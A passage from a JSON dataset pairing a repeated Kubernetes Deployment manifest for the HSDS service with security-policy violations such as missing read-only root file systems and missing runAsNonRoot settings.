volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dn3\" does not have a read-only root file system"
  },
  {
    "id": "2788",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dn4\" does not have a read-only root file system"
  },
  {
    "id": "2789",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"head\" does not have a read-only root file system"
  },
  {
    "id": "2790",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rangeget\" does not have a read-only root file system"
  },
  {
    "id": "2791",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sn\" does not have a read-only root file system"
  },
  {
    "id": "2792",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dn1\" is not set to runAsNonRoot"
  },
  {
    "id": "2793",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dn2\" is not set to runAsNonRoot"
  },
  {
    "id": "2794",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
